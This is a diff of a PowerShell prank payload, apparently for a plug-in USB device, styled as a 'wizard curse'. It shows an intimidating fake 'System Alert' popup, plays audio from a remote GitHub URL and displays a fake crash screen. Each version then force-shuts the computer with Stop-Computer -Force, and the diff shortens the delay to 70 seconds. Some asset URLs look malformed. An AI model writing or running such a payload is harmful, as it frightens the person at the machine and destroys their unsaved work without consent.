@@ -28,7 +28,7 @@ Start-Job {
 
 # 🪦 Creepy popup
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")
+[System.Windows.MessageBox]::Show("A curse has been put one you. Welcome to the wizard realm.","System Alert")
 
 # 🔊 Play creepy audio from GitHub (whispers.wav)
 Add-Type -TypeDefinition @"
@@ -43,7 +43,7 @@ public class Audio {
     }
 }
 "@
-[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.wav")
+[Audio]::Play("https://github.com/andythecookie13bruce/wizard-prank/main/sound.mp3")
 
 # 💀 Glitchy crash screen with creepy style
 $html = @"
@@ -54,7 +54,7 @@ $html = @"
     body {
       margin: 0;
       overflow: hidden;
-      background: url('https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/wizard.png') no-repeat center center fixed;
+      background: url('https://github.com/andythecookie13bruce/wizard-prank/main/wizard.png') no-repeat center center fixed;
       background-size: cover;
       color: #ff0000;
       font-family: 'Creepster', 'UnifrakturCook', cursive;
@@ -122,5 +122,5 @@ Start-Job {
 }
 
 # ⏳ Wait 4 minutes, then shutdown
-Start-Sleep -Seconds 240
+Start-Sleep -Seconds 70
 Stop-Computer -Force
